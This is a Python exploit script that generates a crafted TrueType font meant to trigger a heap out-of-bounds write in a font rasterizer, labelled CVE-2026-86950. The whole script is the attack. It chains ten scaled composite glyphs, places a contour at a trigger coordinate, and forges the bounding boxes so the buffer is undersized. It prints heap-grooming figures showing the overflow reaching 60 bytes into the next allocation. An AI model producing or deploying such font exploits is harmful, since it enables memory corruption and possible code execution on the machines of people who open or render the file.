#!/usr/bin/env python3
"""CVE-2026-86950 heap feng shui font generator.

Parameters: N=10, DX=17, TX=16409
  width_px=1087, buf=4412 bytes (HEAP, above 1015 threshold)
  malloc quantum=5120, padding=708 bytes
  OOB=+768 bytes, crosses padding by 60 bytes into next allocation

Requires: pip install fonttools
"""
import sys
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

UPM   = 16384
N     = 10
SCALE = 32767 / 16384

DX        = 17
TRIGGER_X = 16409

fb = FontBuilder(UPM, isTTF=True)
names = [".notdef", "leaf"] + [f"c{i}" for i in range(N - 1)] + ["A"]
fb.setupGlyphOrder(names)
fb.setupCharacterMap({ord("A"): "A"})

p = TTGlyphPen(None)
p.moveTo((0, 0));  p.lineTo((DX, 0));  p.lineTo((DX, 40));  p.lineTo((0, 40));  p.closePath()
p.moveTo((TRIGGER_X, 1));  p.lineTo((TRIGGER_X, 39));  p.closePath()
glyf = {"leaf": p.glyph()}

p = TTGlyphPen(None)
p.moveTo((0, 0));  p.lineTo((1, 0));  p.lineTo((1, 1));  p.closePath()
glyf[".notdef"] = p.glyph()

gs = dict.fromkeys(names)
prev = "leaf"
for name in names[2:]:
    p = TTGlyphPen(gs)
    p.addComponent(prev, (SCALE, 0, 0, SCALE, 0, 0))
    glyf[name] = p.glyph()
    prev = name

fb.setupGlyf(glyf)
fb.setupHorizontalMetrics({n: (100, 0) for n in names})
fb.setupHorizontalHeader(ascent=100, descent=-100)
fb.setupOS2()
fb.setupNameTable({"familyName": "T", "styleName": "R"})
fb.setupPost()
fb.font["maxp"].maxComponentDepth = N
fb.font.recalcBBoxes = False
for g in glyf.values():
    g.xMin = g.yMin = 0; g.xMax = DX; g.yMax = 40
fb.font["head"].xMin = 0; fb.font["head"].xMax = DX
fb.font["head"].yMin = 0; fb.font["head"].yMax = 40

out = sys.argv[1] if len(sys.argv) > 1 else "feng_shui_trigger.ttf"
fb.save(out)
print(f"wrote {out}")
width_px = int(DX * SCALE**N * 1024/UPM)
print(f"  DX={DX}, width_px={width_px}, buffer={4*(width_px+16)} bytes (HEAP)")
print(f"  trigger_x={TRIGGER_X}, composite levels={N}")
print(f"  OOB: +768 bytes past buffer, +60 bytes into next 5120-byte allocation")
